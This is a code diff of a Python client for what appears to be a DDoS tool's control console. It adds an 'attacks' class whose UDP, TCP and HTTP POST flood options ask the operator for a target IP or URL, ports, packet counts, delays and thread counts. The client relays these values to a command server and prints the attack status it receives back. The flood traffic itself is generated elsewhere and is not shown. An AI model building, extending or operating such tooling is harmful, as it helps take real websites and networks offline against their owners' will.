@@ -17,17 +17,24 @@ class data:
   def recieve(self, client: socket) -> str:
     recieved: str = client.recv(1024).decode("utf-8").strip()
     return recieved
-
-class client:
+  
+class attacks:
   def __init__(self) -> None:
-    self.s: socket = socket(AF_INET, SOCK_STREAM)
     self.data: data = data()
-    self.config: config = config()
 
-    self.ip = self.config.config["server"]["ip"]
-    self.port = self.config.config["server"]["port"]
-    self.username = self.config.config["creds"]["username"]
-    self.password = self.config.config["creds"]["password"]
+  def getStatus(self, client: socket) -> None:
+    Running = True
+    while Running:
+      try:
+        data = client.recv(1024).decode("utf-8")
+        if data == "Stopped":
+          Running = False
+        if data is None or "":
+          pass
+        else:
+          print(data)
+      except Exception as e:
+        print(e)
 
   def SendUDP(self, client: socket) -> None:
     ip: str = input("IP:\t")
@@ -49,20 +56,60 @@ class client:
     threads: str = str(input("Threads (Ex: 80):\t"))
     self.data.send(client, threads)
     sleep(0.5)
+    self.getStatus(client)
     
-    Running = True
-    while Running:
-      try:
-        data = client.recv(1024).decode("utf-8")
-        if data == "Stopped":
-          Running = False
-        if data is None or "":
-          pass
-        else:
-          print(data)
-      except Exception as e:
-        print(e)
-    self.menu(client)
+
+  def SendTCP(self, client: socket) -> None:
+    ip: str = input("IP:\t")
+    self.data.send(client, ip)
+    port: str = str(input("Port (Ex: 80):\t"))
+    self.data.send(client, port)
+    tries: str = str(input("Tries (Ex: 10):\t"))
+    self.data.send(client, tries)
+    packets: str = str(input("Packets (Ex: 1024):\t"))
+    self.data.send(client, packets)
+    repack: str = str(input("Packet Multiplier (Ex: 1):\t"))
+    self.data.send(client, repack)
+    trydelay: str = str(input("Try Delay: S (Ex: 3):\t"))
+    self.data.send(client, trydelay)
+    senddelay: str = str(input("Send Delay: MS (Ex: 10):\t"))
+    self.data.send(client, senddelay)
+    size: str = str(input("Data Size (Ex: 5000):\t"))
+    self.data.send(client, size)
+    threads: str = str(input("Threads (Ex: 50):\t"))
+    self.data.send(client, threads)
+    sleep(0.5)
+    self.getStatus(client)
+  
+  def SendPOST(self, client: socket) -> None:
+    url: str = input("URL (Ex: https://website.com/):\t")
+    self.data.send(client, url)
+    packets: str = str(input("Packets (Ex: 10000):\t"))
+    self.data.send(client, packets)
+    senddelay: str = str(input("Send Delay: MS (Ex: 10):\t"))
+    self.data.send(client, senddelay)
+    size: str = str(input("Data Size (Ex: 10000):\t"))
+    self.data.send(client, size)
+    threads: str = str(input("Threads (Ex: 50):\t"))
+    self.data.send(client, threads)
+    sleep(0.5)
+    self.getStatus(client)
+
+  
+
+class client:
+  def __init__(self) -> None:
+    self.s: socket = socket(AF_INET, SOCK_STREAM)
+    self.data: data = data()
+    self.config: config = config()
+    self.attacks: attacks = attacks()
+
+    self.ip = self.config.config["server"]["ip"]
+    self.port = self.config.config["server"]["port"]
+    self.username = self.config.config["creds"]["username"]
+    self.password = self.config.config["creds"]["password"]
+
+  
 
   def menu(self, client: socket) -> None:
     sleep(0.3)
@@ -72,7 +119,11 @@ class client:
 
     match op:
       case "UDP":
-        self.SendUDP(client)
+        self.attacks.SendUDP(client)
+      case "TCP":
+        self.attacks.SendTCP(client)
+      case "POST":
+        self.attacks.SendPOST(client)
       case "PING":
         sleep(0.1)
         print(self.data.recieve(client)) # Pong!
